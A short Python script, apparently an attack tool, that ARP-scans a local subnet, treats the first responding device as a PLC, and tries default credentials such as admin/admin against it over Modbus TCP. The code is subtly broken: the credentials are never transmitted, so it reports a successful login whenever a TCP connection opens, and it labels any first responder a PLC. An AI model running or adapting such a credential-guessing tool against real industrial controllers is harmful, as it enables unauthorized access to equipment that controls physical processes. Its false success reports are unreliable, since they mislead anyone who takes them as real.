from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient

# Known PLC default credentials (Modify based on specific vendor)
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),   # Common default credentials
    ("root", "root"),
    ("administrator", "password"),
    ("guest", "guest")
]

# Network configuration
NETWORK_RANGE = "192.168.1.0/24"  # Adjust based on actual network


def find_plc():
    """Scans the network for potential PLC devices"""
    print("[+] Scanning Network to Identify PLC...")
    
    # Sending ARP request
    arp = ARP(pdst=NETWORK_RANGE)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parsing responses
    for sent, received in result:
        print(f"[+] Found device: {received.psrc} ({received.hwsrc})")
        return received.psrc  # Returning first active device as PLC
    
    print("[-] No PLC found.")
    return None


def attempt_login(plc_ip):
    """Attempts to authenticate to the PLC using default credentials"""
    print(f"[+] Attempting authentication on PLC at {plc_ip}...")
    
    for username, password in DEFAULT_CREDENTIALS:
        print(f"[+] Trying credentials: {username}/{password}")

        # Modbus example - Use vendor-specific authentication if applicable
        client = ModbusTcpClient(plc_ip)
        connection = client.connect()

        if connection:
            print(f"[+] Successfully authenticated with {username}/{password}")
            client.close()
            return True
            
        client.close()

    print("[-] Authentication failed with default credentials.")
    return False


if __name__ == "__main__":
    plc_ip = find_plc()

    if plc_ip:
        attempt_login(plc_ip)
    else:
        print("[-] No PLC detected. Exiting.")